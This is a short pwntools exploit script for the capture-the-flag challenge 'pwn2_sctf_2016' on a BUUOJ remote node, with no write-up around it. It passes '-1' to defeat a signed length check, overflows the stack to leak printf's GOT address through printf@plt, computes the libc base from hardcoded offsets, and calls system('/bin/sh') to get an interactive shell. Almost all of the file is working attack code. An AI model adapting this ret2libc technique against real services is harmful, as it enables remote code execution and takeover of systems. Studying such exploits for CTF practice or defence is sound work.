# method one

from pwn import *


p = remote("node4.buuoj.cn", 25326)
pro = ELF("./pwn2_sctf_2016")


printf_p = pro.plt["printf"]
printf_g = pro.got["printf"]
start = 0x080483D0


def leak():
    p.sendline("-1")
    p.recvuntil("bytes of data!\n")
    pad = cyclic(0x2c+0x4)
    pad += p32(printf_p)+p32(start)+p32(printf_g)
    p.sendline(pad)
    p.recvline()
    info = p.recvuntil("\xf7")

    return info

info = u32(leak().ljust(4, b"\x00"))
print(hex(info))

# count offset
base = info-0x49020
system = base+0x3a940
binsh = base+0x15902b

# attack
p.sendline("-1")
pad = cyclic(0x2c+0x4)
pad += p32(system)+p32(start)+p32(binsh)
p.sendline(pad)

p.interactive()

